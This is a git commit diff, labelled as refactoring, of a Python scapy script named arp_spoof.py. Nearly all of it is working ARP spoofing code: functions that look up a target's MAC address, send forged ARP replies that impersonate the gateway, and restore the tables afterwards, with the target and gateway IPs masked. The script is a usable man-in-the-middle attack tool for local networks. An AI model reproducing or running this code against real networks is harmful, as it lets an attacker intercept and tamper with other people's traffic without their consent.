6c3efc11d0241ee11f5db3a67a41ff6183b6f0ff
em0ji <rowi.xyz@gmail.com>
2021-10-06 11:28:48 -0400

    code refactoring

--- arp_spoof/arp_spoof.py
+++ arp_spoof/arp_spoof.py
@@ -1,8 +1,6 @@
 #!/usr/bin/env python
-
 import scapy.all as scapy
 import time
-
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -12,12 +10,10 @@ def get_mac(ip):
 
     return answered_list[0][1].hwsrc
 
-
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
-
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
@@ -25,9 +21,8 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-
-target_ip = "192.168.31.174"
-gateway_ip = "192.168.31.1"
+target_ip = "***.***.**.***"
+gateway_ip = "***.***.**.*"
 
 try:
     send_packets_count = 0
